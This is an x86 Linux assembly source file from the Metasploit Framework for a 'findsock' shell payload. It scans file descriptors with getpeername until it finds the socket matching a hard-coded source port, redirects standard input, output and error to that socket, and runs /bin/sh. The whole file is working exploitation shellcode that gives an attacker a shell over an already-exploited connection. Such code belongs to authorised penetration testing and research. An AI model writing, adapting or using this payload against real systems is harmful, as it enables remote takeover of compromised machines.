;;
;
;        Name: single_findsock
;   Platforms: Linux
;     Authors: vlad902 <vlad902 [at] gmail.com>
;     Authors: skape <mmiller [at] hick.org>
;     Version: $Revision: 1856 $
;     License:
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        Search file descriptors based on source port.
;
;;

BITS 32

global main

main:
	xor	edx, edx
	push	edx
	mov	ebp, esp

	push	byte 0x07
	pop	ebx

	push	byte 0x10
	push	esp
	push	ebp
	push	edx

	mov	ecx, esp
getpeername_loop:
	inc	dword [ecx]

	push	byte 0x66
	pop	eax
	int	0x80

	cmp	word [ebp + 2], 0x5c11
	jne	getpeername_loop

	pop	ebx
	push	byte 0x02
	pop	ecx

dup2_loop:
	mov	al, 0x3f
	int	0x80
	dec	ecx
	jns	dup2_loop

	push	edx
	push	dword 0x68732f2f
	push	dword 0x6e69622f
	mov	ebx, esp

	push	edx
	push	ebx
	mov	ecx, esp

	mov	al, 0x0b
	int	0x80
